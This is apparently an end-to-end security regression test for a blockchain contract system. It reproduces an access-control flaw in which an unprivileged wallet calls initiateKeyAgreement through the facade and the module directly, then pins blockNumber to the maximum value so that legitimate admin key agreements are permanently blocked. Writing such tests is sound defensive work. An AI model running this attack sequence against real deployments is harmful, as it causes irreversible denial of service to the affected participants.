/**
 * @title E2E SECURITY: F12 — `initiateKeyAgreement` missing access control (facade + module)
 *
 * @description Both `ParticipantStorageV1.initiateKeyAgreement` (missing
 *              `restricted`) and `AuditManagerV1.initiateKeyAgreement` (missing
 *              `onlyParticipantStorage`) accept calls from any address.
 *              `initiateKeyAgreement` enforces a strict monotonic block-number
 *              ordering per chain-pair (AuditManagerV1.sol L161-166). An
 *              attacker who pins `blockNumber = 2^256-1` permanently DoSes
 *              every legitimate key agreement between the poisoned pair —
 *              irreversible without a contract upgrade (the append-only
 *              `keyAgreementData[]` has no admin-delete path).
 *
 * EXPECTED BEHAVIOUR
 *   - Pre-fix: attacker's facade and module-direct calls both land. State is
 *     corrupted with a max-blockNumber entry. A subsequent legitimate admin
 *     call reverts because its blockNumber is lower than the poisoned entry.
 *     Test FAILS with the full DoS chain logged.
 *   - Post-fix: facade rejects via `restricted`; module rejects via
 *     `onlyParticipantStorage`. Test PASSES.
 *
 * LIVE STATE IMPACT
 *   Pre-fix this test permanently corrupts the pair PN_A ↔ PN_B. Re-run
 *   `./start_dev.sh --clean 6` before any test that depends on a clean key
 *   agreement history.
 */

import { ethers } from 'ethers';
import { expect } from 'chai';
import { DEFAULT_TIMEOUT, GAS_LIMIT, LOGGER } from '../../../src/config/env-config';
import { initializePrivacyNodesAndPnh, PrivacyNodeMap } from '../../setup';
import { PrivateHub } from '../../../src/entities/PrivateHub';
import {
  ParticipantStorageV1__factory,
  AuditManagerV1__factory,
} from '../../../typechain-types';
import { createUserOperator } from '../../../src/utils/wallet-factory';
import { submitTx } from '../../../src/utils/common';

const MAX_UINT256 = (1n << 256n) - 1n;
// Chain IDs per-run so rerunning against a live (uncleaned) PNH doesn't hit
// residue from previous runs. 17-bit entropy is ample within uint256 space
// and stays distinct from real PN chainIds (12345/12346) and operator chainId 999.
const RUN_TAG = Date.now() % 100000;
const POISON_CHAIN_A = 820000 + RUN_TAG * 10;
const POISON_CHAIN_B = POISON_CHAIN_A + 1;
const LEGIT_BLOCK = 1000;

describe('E2E SECURITY: F12 — initiateKeyAgreement missing access control', function () {
  this.timeout(DEFAULT_TIMEOUT);

  let privacyNodes: PrivacyNodeMap;
  let privateHub: PrivateHub;
  let attacker: ethers.HDNodeWallet;
  let auditManagerAddress: string;
  let pnA_chainId: number;
  let pnB_chainId: number;

  before(async function () {
    LOGGER.log('\n   ═══════════════════════════════════════════════════════════════');
    LOGGER.log('   F12: initiateKeyAgreement missing AC — E2E setup');
    LOGGER.log('   ═══════════════════════════════════════════════════════════════');

    const { initializedNodes, initializedPNH } = await initializePrivacyNodesAndPnh(2);
    privacyNodes = initializedNodes;
    privateHub = initializedPNH;
    pnA_chainId = Number(privacyNodes.A.chainId);
    pnB_chainId = Number(privacyNodes.B.chainId);

    const facade = ParticipantStorageV1__factory.connect(
      privateHub.participantStorageAddress,
      privateHub.adminWallet
    );
    auditManagerAddress = await facade.getAuditManager();

    attacker = createUserOperator(privateHub.provider);
    await submitTx(
      () => privateHub.adminWallet.sendTransaction({
        to: attacker.address,
        value: ethers.parseEther('0.3'),
      }) as Promise<ethers.ContractTransactionResponse>,
      'F12: fund attacker on PNH',
    );

    LOGGER.log(`   PNH chainId         : ${(await privateHub.provider.getNetwork()).chainId}`);
    LOGGER.log(`   ParticipantStorage  : ${privateHub.participantStorageAddress}`);
    LOGGER.log(`   AuditManager        : ${auditManagerAddress}`);
    LOGGER.log(`   PN_A chainId        : ${pnA_chainId}`);
    LOGGER.log(`   PN_B chainId        : ${pnB_chainId}`);
    LOGGER.log(`   Attacker (no roles) : ${attacker.address}`);
  });

  // ════════════════════════════════════════════════════════════════════════════
  //  BASELINE  -  always pass
  // ════════════════════════════════════════════════════════════════════════════

  it('F12-E2E-baseline: canCall false on facade AND module for the attacker', async function () {
    const manager = await privateHub.getAccessManager();

    const facadeSel = ParticipantStorageV1__factory.createInterface()
      .getFunction('initiateKeyAgreement')!.selector;
    const moduleSel = AuditManagerV1__factory.createInterface()
      .getFunction('initiateKeyAgreement')!.selector;

    const [aFacade] = await manager.canCall(attacker.address, privateHub.participantStorageAddress, facadeSel);
    const [aModule] = await manager.canCall(attacker.address, auditManagerAddress, moduleSel);
    LOGGER.log(`   canCall(attacker, facade, initiateKeyAgreement.sig).allowed = ${aFacade}`);
    LOGGER.log(`   canCall(attacker, module, initiateKeyAgreement.sig).allowed = ${aModule}`);
    expect(aFacade, 'baseline: facade canCall false').to.equal(false);
    expect(aModule, 'baseline: module canCall false').to.equal(false);
  });

  // ════════════════════════════════════════════════════════════════════════════
  //  EXPLOIT — FAILS pre-fix, PASSES post-fix
  // ════════════════════════════════════════════════════════════════════════════

  it('F12-E2E-exploit-facade: attacker forges a key agreement via the facade (no `restricted`)', async function () {
    const facade = ParticipantStorageV1__factory.connect(
      privateHub.participantStorageAddress,
      attacker
    );
    const auditReader = AuditManagerV1__factory.connect(auditManagerAddress, privateHub.adminWallet);

    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log(`   PHASE 1: attacker.initiateKeyAgreement(${POISON_CHAIN_A}, ${POISON_CHAIN_B}, ..., 2^256-1)`);
    LOGGER.log('   ─────────────────────────────────────────────────────────────');

    // The require(verifyParticipant(...)) inside AuditManagerV1.initiateKeyAgreement
    // demands both chains be ACTIVE participants. We seed two fresh participants
    // here from admin to isolate poisoning to this test's pair.
    const facadeAsAdmin = ParticipantStorageV1__factory.connect(
      privateHub.participantStorageAddress,
      privateHub.adminWallet
    );
    for (const chainId of [POISON_CHAIN_A, POISON_CHAIN_B]) {
      try {
        const verified = await facadeAsAdmin.verifyParticipant(chainId);
        if (!verified) {
          await submitTx(
            () => facadeAsAdmin.addParticipant(
              { chainId, role: 0, ownerId: 'F12-ci', name: `F12-${chainId}`, allowedToBroadcast: true },
              { gasLimit: GAS_LIMIT },
            ),
            `F12: addParticipant ${chainId}`,
          );
          await submitTx(
            () => facadeAsAdmin.updateStatus(chainId, 1 /* ACTIVE */, { gasLimit: GAS_LIMIT }),
            `F12: activate participant ${chainId}`,
          );
        }
      } catch (e: any) {
        LOGGER.log(`   seeding ${chainId} failed (may already exist): ${e?.shortMessage || e?.message}`);
      }
    }

    let landed = false;
    let revertReason = '';
    let txHash: string | null = null;
    try {
      const tx = await facade.initiateKeyAgreement(
        POISON_CHAIN_A,
        POISON_CHAIN_B,
        '0xdeadbeef',
        '0xc0ffee',
        MAX_UINT256,
        { gasLimit: GAS_LIMIT }
      );
      const receipt = await tx.wait();
      txHash = receipt!.hash;
      landed = true;
      LOGGER.log(`   facade call SUCCEEDED — tx ${txHash}`);
    } catch (e: any) {
      revertReason = e?.shortMessage || e?.message || String(e);
      LOGGER.log(`   facade call reverted: ${revertReason}`);
    }

    const entries = await auditReader.getKeyAgreements(POISON_CHAIN_A);
    LOGGER.log(`   keyAgreements[PN_A].length = ${entries.length}`);
    if (entries.length > 0) {
      LOGGER.log(`   Latest pinned blockNumber  = ${entries[entries.length - 1].blockNumber}`);
    }

    if (landed) {
      LOGGER.log('\n   ╔══════════════════════════════════════════════════════════╗');
      LOGGER.log('   ║   F12 EXPLOIT REPRODUCED — facade accepts unauthed call   ║');
      LOGGER.log('   ╚══════════════════════════════════════════════════════════╝');
      LOGGER.log(`   Attacker (no roles)    : ${attacker.address}`);
      LOGGER.log(`   Target facade          : ${privateHub.participantStorageAddress}`);
      LOGGER.log(`   Target module          : ${auditManagerAddress}`);
      LOGGER.log(`   Exploit tx             : ${txHash}`);
      LOGGER.log(`   Poisoned blockNumber   : ${MAX_UINT256}`);
    }

    expect(
      landed,
      'F12: facade accepted attacker.initiateKeyAgreement (no `restricted`)'
    ).to.equal(false);
  });

  it('F12-E2E-exploit-module: attacker bypasses the facade entirely by calling the module directly', async function () {
    const moduleAsAttacker = AuditManagerV1__factory.connect(auditManagerAddress, attacker);

    // Use a distinct pair for the module test so prior tests' pinned
    // max-blockNumber on 823101/823102 does not cause this call to revert for
    // reasons unrelated to the access-control bypass we are demonstrating.
    const moduleChainA = POISON_CHAIN_A + 100;
    const moduleChainB = POISON_CHAIN_B + 100;

    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 1: attacker calls AuditManagerV1.initiateKeyAgreement DIRECTLY');
    LOGGER.log(`   Using fresh pair ${moduleChainA} / ${moduleChainB} to isolate from other tests`);
    LOGGER.log('   ─────────────────────────────────────────────────────────────');

    // Ensure the fresh pair are ACTIVE participants on the live PNH so
    // the module's verifyParticipant precondition passes.
    const facadeAsAdmin = ParticipantStorageV1__factory.connect(
      privateHub.participantStorageAddress,
      privateHub.adminWallet
    );
    for (const chainId of [moduleChainA, moduleChainB]) {
      try {
        const verified = await facadeAsAdmin.verifyParticipant(chainId);
        if (!verified) {
          await submitTx(
            () => facadeAsAdmin.addParticipant(
              { chainId, role: 0, ownerId: 'F12-ci', name: `F12-${chainId}`, allowedToBroadcast: true },
              { gasLimit: GAS_LIMIT },
            ),
            `F12: addParticipant ${chainId}`,
          );
          await submitTx(
            () => facadeAsAdmin.updateStatus(chainId, 1 /* ACTIVE */, { gasLimit: GAS_LIMIT }),
            `F12: activate participant ${chainId}`,
          );
        }
      } catch {/* ignore */}
    }

    let landed = false;
    let txHash: string | null = null;
    let revertReason = '';
    try {
      // Use a realistic blockNumber so we don't depend on prior test state.
      // We only care that the call lands at the module layer.
      const tx = await moduleAsAttacker.initiateKeyAgreement(
        moduleChainA,
        moduleChainB,
        '0xbaad',
        '0xf00d',
        10,
        { gasLimit: GAS_LIMIT }
      );
      const receipt = await tx.wait();
      txHash = receipt!.hash;
      landed = true;
      LOGGER.log(`   module-direct call SUCCEEDED — tx ${txHash}`);
    } catch (e: any) {
      revertReason = e?.shortMessage || e?.message || String(e);
      LOGGER.log(`   module-direct call reverted: ${revertReason}`);
    }

    if (landed) {
      LOGGER.log('\n   ╔══════════════════════════════════════════════════════════╗');
      LOGGER.log('   ║   F12 EXPLOIT — module-direct call bypasses the facade    ║');
      LOGGER.log('   ╚══════════════════════════════════════════════════════════╝');
      LOGGER.log(`   Attacker (no roles)    : ${attacker.address}`);
      LOGGER.log(`   Target module          : ${auditManagerAddress}`);
      LOGGER.log(`   Exploit tx             : ${txHash}`);
    }

    expect(
      landed,
      'F12: module-direct call landed (no `onlyParticipantStorage`)'
    ).to.equal(false);
  });

  it('F12-E2E-exploit-dos: attacker pins blockNumber=2^256-1; later legitimate call is permanently blocked', async function () {
    // Re-poison using a fresh pair to avoid conflating with earlier tests.
    const poisonA = POISON_CHAIN_A + 1;
    const poisonB = POISON_CHAIN_B + 1;

    const facadeAsAdmin = ParticipantStorageV1__factory.connect(
      privateHub.participantStorageAddress,
      privateHub.adminWallet
    );
    for (const chainId of [poisonA, poisonB]) {
      try {
        const verified = await facadeAsAdmin.verifyParticipant(chainId);
        if (!verified) {
          await submitTx(
            () => facadeAsAdmin.addParticipant(
              { chainId, role: 0, ownerId: 'F12-dos', name: `F12-dos-${chainId}`, allowedToBroadcast: true },
              { gasLimit: GAS_LIMIT },
            ),
            `F12-dos: addParticipant ${chainId}`,
          );
          await submitTx(
            () => facadeAsAdmin.updateStatus(chainId, 1, { gasLimit: GAS_LIMIT }),
            `F12-dos: activate participant ${chainId}`,
          );
        }
      } catch {/* ignore */}
    }

    const facadeAsAttacker = ParticipantStorageV1__factory.connect(
      privateHub.participantStorageAddress,
      attacker
    );

    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log('   PHASE 1: attacker pins blockNumber = 2^256-1');
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    let pinLanded = false;
    try {
      await (await facadeAsAttacker.initiateKeyAgreement(
        poisonA, poisonB, '0x11', '0x22', MAX_UINT256, { gasLimit: GAS_LIMIT }
      )).wait();
      pinLanded = true;
      LOGGER.log(`   pin SUCCEEDED at blockNumber=${MAX_UINT256}`);
    } catch (e: any) {
      LOGGER.log(`   pin reverted: ${e?.shortMessage || e?.message}`);
    }

    LOGGER.log('\n   ─────────────────────────────────────────────────────────────');
    LOGGER.log(`   PHASE 2: admin tries legitimate blockNumber=${LEGIT_BLOCK}`);
    LOGGER.log('   ─────────────────────────────────────────────────────────────');
    let legitLanded = false;
    let legitRevertReason = '';
    try {
      await submitTx(
        () => facadeAsAdmin.initiateKeyAgreement(
          poisonA, poisonB, '0x33', '0x44', LEGIT_BLOCK, { gasLimit: GAS_LIMIT },
        ),
        `F12-dos: legit initiateKeyAgreement (blockNumber=${LEGIT_BLOCK})`,
      );
      legitLanded = true;
      LOGGER.log(`   legit call SUCCEEDED at blockNumber=${LEGIT_BLOCK}`);
    } catch (e: any) {
      legitRevertReason = e?.shortMessage || e?.message || String(e);
      LOGGER.log(`   legit call reverted: ${legitRevertReason}`);
    }

    if (pinLanded && !legitLanded) {
      LOGGER.log('\n   ╔══════════════════════════════════════════════════════════╗');
      LOGGER.log('   ║   F12 DOS REPRODUCED — admin is permanently blocked       ║');
      LOGGER.log('   ╚══════════════════════════════════════════════════════════╝');
      LOGGER.log(`   Attacker pinned blockNumber = ${MAX_UINT256}`);
      LOGGER.log(`   Admin\'s legit blockNumber    = ${LEGIT_BLOCK} — reverted`);
      LOGGER.log(`   Revert reason               : ${legitRevertReason}`);
      LOGGER.log('   Storage layer has no admin-delete for keyAgreementData[] → DoS is PERMANENT until upgrade.');
    }

    expect(
      pinLanded && !legitLanded,
      'F12 DOS: attacker pinned max blockNumber and blocked admin\'s legitimate call'
    ).to.equal(false);
  });
});
